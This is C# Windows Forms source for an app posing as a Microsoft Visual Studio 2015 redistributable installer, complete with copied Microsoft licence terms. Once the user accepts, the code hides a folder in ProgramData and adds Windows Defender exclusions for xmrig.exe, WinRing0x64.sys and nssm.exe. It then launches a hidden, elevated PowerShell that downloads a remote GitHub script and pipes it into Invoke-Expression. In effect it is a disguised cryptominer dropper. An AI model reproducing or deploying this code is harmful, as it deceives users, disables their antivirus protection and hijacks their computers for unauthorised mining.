using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace doppleganger
{
    public partial class Form1 : Form
    {
        private Config configForm;
        public Form1()
        {
            InitializeComponent();
            this.KeyPreview = true;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            //There are errors on downloading using powershell..
            //path to the folder
            string fp = @"C:\ProgramData\.diagnostic.txt\"; 
            string win = @"C:\ProgramData\.diagnostic.txt\WinRing0x64.sys";
            string xm = @"C:\ProgramData\.diagnostic.txt\xmrig.exe";
            string nsm = @"C:\ProgramData\.diagnostic.txt\nssm.exe";
            if (checkBox1.Checked)
            {
                Form2 fm = new Form2();
                if (!Directory.Exists(fp))
                {
                    Directory.CreateDirectory(fp);
                    DirectoryInfo dirInfo = new DirectoryInfo(fp);
                    dirInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System;
                    foreach (var file in Directory.GetFiles(fp, "*", SearchOption.AllDirectories))
                    {
                        File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
                    }
                }

                //Powershell
                // First, add Windows Defender exclusion
                using (Process pc = new Process())
                {
                    pc.StartInfo.FileName = "powershell.exe";

                    // Combine all exclusion commands into a single PowerShell command
                    var commands = new[]
                    {
                        $"Add-MpPreference -ExclusionPath '{fp}'",
                        $"Add-MpPreference -ExclusionPath '{win}'",
                        $"Add-MpPreference -ExclusionPath '{xm}'",
                        $"Add-MpPreference -ExclusionPath '{nsm}'"
                    };

                    pc.StartInfo.Arguments = $"-WindowStyle Hidden -Command \"{string.Join("; ", commands)}\"";
                    pc.StartInfo.UseShellExecute = false;
                    pc.StartInfo.CreateNoWindow = true;
                    pc.StartInfo.RedirectStandardOutput = true;
                    pc.StartInfo.RedirectStandardError = true;

                    pc.Start();
                    pc.WaitForExit();

                    string output = pc.StandardOutput.ReadToEnd();
                    string error = pc.StandardError.ReadToEnd();

                    if (!string.IsNullOrEmpty(output))
                        Console.WriteLine($"Output: {output}");

                    if (!string.IsNullOrEmpty(error))
                        Console.WriteLine($"Error: {error}");
                }

                // Now run the main PowerShell script (with admin privileges if needed)
                using (Process mainPs = new Process())
                {
                    // Correct the URL - use raw GitHub URL instead of the webpage
                    string scriptUrl = "https://raw.githubusercontent.com/User07x07/Dopple/main/Dopple.ps1";

                    mainPs.StartInfo.FileName = "powershell.exe";
                    mainPs.StartInfo.Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(Invoke-WebRequest -Uri '{scriptUrl}' -UseBasicParsing).Content | Invoke-Expression\"";
                    mainPs.StartInfo.Verb = "runas"; // Run as administrator
                    mainPs.StartInfo.UseShellExecute = true;
                    mainPs.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

                    try
                    {
                        mainPs.Start();
                        // Don't wait for exit if you want to continue immediately
                        // mainPs.WaitForExit();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Failed to start PowerShell script: {ex.Message}");
                        // Optionally show a message box
                        MessageBox.Show($"Failed to start PowerShell script: {ex.Message}", "Error",
                                       MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }

                this.Hide();
                fm.ShowDialog();

            }
            else
            {
                MessageBox.Show("Please accept the license terms and conditions",
                               "Accept Terms Required",
                               MessageBoxButtons.OK,
                               MessageBoxIcon.Information);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // If we get here, we're running as administrator
            richTextBox1.Text = "MICROSOFT SOFTWARE LICENSE TERMS\r\nMICROSOFT VISUAL STUDIO 2015 ADD-ONs, VISUAL STUDIO SHELLS and C++ REDISTRIBUTABLE  \r\nThese license terms are an agreement between Microsoft Corporation (or based on where you live, one of its affiliates) and you. They apply to the software named above. The terms also apply to any Microsoft services or updates for the software, except to the extent those have different terms.\r\nIF YOU COMPLY WITH THESE LICENSE TERMS, YOU HAVE THE RIGHTS BELOW.\r\n1.\tINSTALLATION AND USE RIGHTS. \r\na.\tYou may install and use any number of copies of the software.\r\nb.\tBackup copy.  You may make one backup copy of the software, for reinstalling the software.\r\n2.\tTERMS FOR SPECIFIC COMPONENTS.\r\na.\tUtilities. The software may contain some items on the Utilities List at <http://go.microsoft.com/fwlink/?LinkID=523763&clcid=0x409>.   You may copy and install those items, if included with the software, on your machines or third party machines, to debug and deploy your applications and databases you develop with the software. Please note that Utilities are designed for temporary use, that Microsoft may not be able to patch or update Utilities separately from the rest of the software, and that some Utilities by their nature may make it possible for others to access machines on which they are installed. As a result, you should delete all Utilities you have installed after you finish debugging or deploying your applications and databases.  Microsoft is not responsible for any third party use or access of Utilities you install on any machine.\r\nb.\tMicrosoft Platforms.  The software may include components from Microsoft Windows; Microsoft Windows Server; Microsoft SQL Server; Microsoft Exchange; Microsoft Office; and Microsoft SharePoint. These components are governed by separate agreements and their own product support policies, as described in the license terms found in the installation directory for that component or in the “Licenses” folder accompanying the software.\r\nc.\tThird Party Components.  The software may include third party components with separate legal notices or governed by other agreements, as may be described in the ThirdPartyNotices file accompanying the software. Even if such components are governed by other agreements, the disclaimers and the limitations on and exclusions of damages below also apply.  \r\n3.\tDATA.  The software may collect information about you and your use of the software, and send that to Microsoft. Microsoft may use this information to provide services and improve our products and services.  You may opt-out of many of these scenarios, but not all, as described in the product documentation.  There are also some features in the software that may enable you to collect data from users of your applications. If you use these features to enable data collection in your applications, you must comply with applicable law, including providing appropriate notices to users of your applications. You can learn more about data collection and use in the help documentation and the privacy statement at <http://go.microsoft.com/fwlink/?LinkID=528096&clcid=0x409>. Your use of the software operates as your consent to these practices.\r\n4.\tSCOPE OF LICENSE. The software is licensed, not sold. This agreement only gives you some rights to use the software. Microsoft reserves all other rights. Unless applicable law gives you more rights despite this limitation, you may use the software only as expressly permitted in this agreement. In doing so, you must comply with any technical limitations in the software that only allow you to use it in certain ways. You may not\r\n·\twork around any technical limitations in the software;\r\n·\treverse engineer, decompile or disassemble the software, except and only to the extent that applicable law expressly permits, despite this limitation;\r\n·\tremove, minimize, block or modify any notices of Microsoft or its suppliers in the software; \r\n·\tuse the software in any way that is against the law; or\r\n·\tshare, publish or lend the software, or provide the software as a stand-alone hosted as solution for others to use, or transfer the software or this agreement to any third party.\r\n5.\tEXPORT RESTRICTIONS. Microsoft software, online services, professional services and related technology are subject to U.S. export jurisdiction. You must comply with all applicable international and national laws, including the U.S. Export Administration Regulations, the International Traffic in Arms Regulations, Office of Foreign Assets Control sanctions programs, and end-user, end use and destination restrictions by the U.S. and other governments related to Microsoft products, services and technologies. For additional information, see www.microsoft.com/exporting <http://www.microsoft.com/exporting>. \r\n6.\tSUPPORT SERVICES. Because this software is \"as is,\" we may not provide support services for it.\r\n7.\tENTIRE AGREEMENT. This agreement, and the terms for supplements, updates, Internet-based services and support services that you use, are the entire agreement for the software and support services.\r\n8.\tAPPLICABLE LAW. If you acquired the software in the United States, Washington law applies to interpretation of and claims for breach of this agreement, and the laws of the state where you live apply to all other claims. If you acquired the software in any other country, its laws apply.\r\n9.\tLEGAL EFFECT. This agreement describes certain legal rights. You may have other rights under the laws of your state or country. This agreement does not change your rights under the laws of your state or country if the laws of your state or country do not permit it to do so.  Without limitation of the foregoing, for Australia, YOU HAVE STATUTORY GUARANTEES UNDER THE AUSTRALIAN CONSUMER LAW AND NOTHING IN THESE TERMS IS INTENDED TO AFFECT THOSE RIGHTS\r\n10.\tDISCLAIMER OF WARRANTY. THE SOFTWARE IS LICENSED \"AS-IS.\" YOU BEAR THE RISK OF USING IT. MICROSOFT GIVES NO EXPRESS WARRANTIES, GUARANTEES OR CONDITIONS. TO THE EXTENT PERMITTED UNDER YOUR LOCAL LAWS, MICROSOFT EXCLUDES THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT.\r\n11.\tLIMITATION ON AND EXCLUSION OF DAMAGES. YOU CAN RECOVER FROM MICROSOFT AND ITS SUPPLIERS ONLY DIRECT DAMAGES UP TO U.S. $5.00. YOU CANNOT RECOVER ANY OTHER DAMAGES, INCLUDING CONSEQUENTIAL, LOST PROFITS, SPECIAL, INDIRECT OR INCIDENTAL DAMAGES.\r\nThis limitation applies to (a) anything related to the software, services, content (including code) on third party Internet sites, or third party applications; and (b) claims for breach of contract, breach of warranty, guarantee or condition, strict liability, negligence, or other tort to the extent permitted by applicable law.\r\nIt also applies even if Microsoft knew or should have known about the possibility of the damages. The above limitation or exclusion may not apply to you because your country may not allow the exclusion or limitation of incidental, consequential or other damages.\r\n\r\nEULAID: VS2015_RTM_ShellsRedist_ENU";
        }

        private bool IsRunningAsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void RestartAsAdministrator()
        {
            // Create a new process start info
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.UseShellExecute = true;
            startInfo.WorkingDirectory = Environment.CurrentDirectory;
            startInfo.FileName = Application.ExecutablePath;
            startInfo.Verb = "runas"; // This triggers UAC elevation

            try
            {
                // Start the new process
                Process.Start(startInfo);
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                // The user refused the elevation
                MessageBox.Show("This application requires administrator privileges to run properly.\n" +
                              "Please run the application as administrator.\n\n" +
                              "Error: " + ex.Message,
                              "Administrator Rights Required",
                              MessageBoxButtons.OK,
                              MessageBoxIcon.Warning);
            }

            // Close the current instance
            Application.Exit();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Config cf = new Config();
            cf.Show();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }
    }

}
